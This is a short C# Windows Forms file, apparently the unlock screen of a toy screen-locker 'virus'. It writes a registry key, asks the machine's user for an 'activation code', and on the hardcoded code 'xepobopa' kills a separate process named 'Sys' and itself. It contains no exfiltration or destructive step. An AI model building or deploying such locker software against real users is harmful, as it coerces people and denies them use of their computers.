using Microsoft.Win32;
using System.Diagnostics;

namespace Virus
{
    public partial class Form1 : Form
    {
        public Form1()
        {
            InitializeComponent();
            
            RegistryKey virusKey = Registry.CurrentUser.CreateSubKey("Virus");
            virusKey.SetValue("virusState", "0");
            virusKey.Close();

            this.label1.Text = $"Dear, {Environment.MachineName}, enter your activation code";
            this.timer1.Interval = 400;
            this.timer1.Start();
        }

        private void button1_Click(object sender, EventArgs e)
        {
            if (this.TBInput.Text.ToLower().Equals("xepobopa"))
            {
                Registry.CurrentUser.OpenSubKey("Virus", true).SetValue("virusState", "1");
            }
            else
            {
                this.TBInput.PlaceholderText = "Wrong!";
            }
        }

        private void timer1_Tick(object sender, EventArgs e)
        {
            if (Registry.CurrentUser.OpenSubKey("Virus").GetValue("virusState").ToString().Equals("1"))
            {
                Process.GetProcessesByName("Sys")[0].Kill();
                Process.GetCurrentProcess().Kill();
            }
        }
    }
}